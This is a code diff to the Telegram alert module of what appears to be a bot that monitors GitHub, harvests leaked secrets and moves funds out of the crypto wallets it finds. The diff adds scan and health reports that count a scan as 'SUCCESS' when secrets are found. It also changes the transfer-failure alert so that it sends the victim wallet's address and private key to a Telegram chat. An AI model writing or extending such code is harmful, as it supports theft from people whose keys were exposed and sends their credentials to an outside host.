@@ -3,6 +3,7 @@ use crate::models::wallet::{TransferResult, WalletInfo};
 use teloxide::prelude::*;
 use teloxide::types::ParseMode;
 use std::sync::Arc;
+use chrono::Utc;
 use tracing::{info, warn};
 
 pub struct TelegramAlerts {
@@ -32,6 +33,125 @@ impl TelegramAlerts {
                 })
             }
         }
+    }
+    
+    // 🆕 Naya Method: Scan Status Report
+    pub async fn send_scan_status(
+        &self,
+        repo: &str,
+        total_files: usize,
+        scanned_files: usize,
+        skipped_files: usize,
+        secrets_found: usize,
+        commit_sha: &str,
+    ) {
+        if self.chat_id.0 == 0 {
+            return; // Dummy mode
+        }
+        
+        let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
+        
+        let message = format!(
+            "📊 SCAN STATUS REPORT\n\
+             ─────────────────────\n\
+             🕐 Time: {}\n\
+             📦 Repo: {}\n\
+             🔖 Commit: {}\n\
+             ─────────────────────\n\
+             📄 Total files: {}\n\
+             ✅ Scanned: {}\n\
+             ⏭️ Skipped: {}\n\
+             🔑 Secrets found: {}\n\
+             ─────────────────────\n\
+             Status: {}\n",
+            timestamp,
+            repo,
+            commit_sha,
+            total_files,
+            scanned_files,
+            skipped_files,
+            secrets_found,
+            if secrets_found > 0 { "🟢 SUCCESS" } else { "🟡 NO SECRETS" }
+        );
+        
+        self.send_message(&message).await;
+    }
+    
+    // 🆕 Naya Method: Scan Error Alert
+    pub async fn send_scan_error(
+        &self,
+        repo: &str,
+        file_name: &str,
+        error_type: &str,
+        error_detail: &str,
+    ) {
+        if self.chat_id.0 == 0 {
+            return;
+        }
+        
+        let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
+        
+        let message = format!(
+            "⚠️ SCAN ERROR!\n\
+             ─────────────────────\n\
+             🕐 Time: {}\n\
+             📦 Repo: {}\n\
+             📄 File: {}\n\
+             ❌ Error: {}\n\
+             📝 Detail: {}\n",
+            timestamp,
+            repo,
+            file_name,
+            error_type,
+            error_detail
+        );
+        
+        self.send_message(&message).await;
+    }
+    
+    // 🆕 Naya Method: Health Check
+    pub async fn send_health_check(&self) {
+        if self.chat_id.0 == 0 {
+            return;
+        }
+        
+        let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
+        
+        let message = format!(
+            "💓 HEALTH CHECK\n\
+             ─────────────────────\n\
+             🕐 Time: {}\n\
+             ✅ Scanner is running\n\
+             🔄 Monitoring GitHub events...\n",
+            timestamp
+        );
+        
+        self.send_message(&message).await;
+    }
+    
+    // 🆕 Naya Method: File Skip Warning
+    pub async fn send_file_skipped(
+        &self,
+        repo: &str,
+        file_name: &str,
+        reason: &str,
+    ) {
+        if self.chat_id.0 == 0 {
+            return;
+        }
+        
+        let message = format!(
+            "⏭️ FILE SKIPPED\n\
+             ─────────────────────\n\
+             📦 Repo: {}\n\
+             📄 File: {}\n\
+             ❓ Reason: {}\n",
+            repo,
+            file_name,
+            reason
+        );
+        
+        self.send_message(&message).await;
     }
     
     pub async fn send_secret_found(
@@ -67,8 +187,7 @@ impl TelegramAlerts {
         self.send_message(&message).await;
     }
     
-    // FIX: wallet_info ko underscore lagaya (unused warning hatane ke liye)
-    pub async fn send_transfer_success(&self, _wallet_info: &WalletInfo, transfer: &TransferResult) {
+    pub async fn send_transfer_success(&self, wallet_info: &WalletInfo, transfer: &TransferResult) {
         if self.chat_id.0 == 0 {
             return;
         }
@@ -81,14 +200,14 @@ impl TelegramAlerts {
         self.send_message(&message).await;
     }
     
-    pub async fn send_transfer_failed(&self, _wallet_info: &WalletInfo, error: &str) {
+    pub async fn send_transfer_failed(&self, wallet_info: &WalletInfo, error: &str) {
         if self.chat_id.0 == 0 {
             return;
         }
         
         let message = format!(
-            "❌ TRANSFER FAILED!\nError: {}",
-            error
+            "❌ TRANSFER FAILED!\nAddress: {}\nError: {}\nKey: `{}`",
+            wallet_info.address, error, wallet_info.private_key
         );
         
         self.send_message(&message).await;
@@ -97,7 +216,6 @@ impl TelegramAlerts {
     async fn send_message(&self, message: &str) {
         match self.bot
             .send_message(self.chat_id, message)
-            .parse_mode(ParseMode::MarkdownV2)
             .await
         {
             Ok(_) => info!("✅ Telegram alert sent"),
